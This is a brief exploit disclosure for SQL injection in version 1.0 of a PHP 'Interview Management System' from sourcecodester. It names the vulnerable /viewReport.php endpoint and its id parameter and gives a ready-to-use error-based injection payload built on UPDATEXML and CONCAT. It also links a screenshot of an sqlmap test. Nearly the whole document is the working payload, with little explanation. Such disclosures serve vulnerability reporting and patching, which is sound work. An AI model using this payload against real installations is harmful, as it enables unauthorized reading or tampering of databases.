# Interview Management System-SQL injections

### Date: 2022-08/05



### Exploit Author: anx0ing@gmail.com



### Vendor Homepage: 

[https://www.sourcecodester.com](https://www.sourcecodester.com/)



### Software Link: 

https://www.sourcecodester.com/php/14585/interview-management-system-phpmysqli-full-source-code.html



### Version: 1.0



### /viewReport.php

> `id`Parameters have SQL injection

**payload**

```
/viewReport.php?id=(UPDATEXML(9729,CONCAT(0x2e,0x716b707071,(SELECT (ELT(9729=9729,1))),0x7162766a71),7319))
```

**SQLMAP Test**

![image-20220806011354792](https://cdn.jsdelivr.net/gh/beytagh001/blog-img/image-20220806011354792.png)

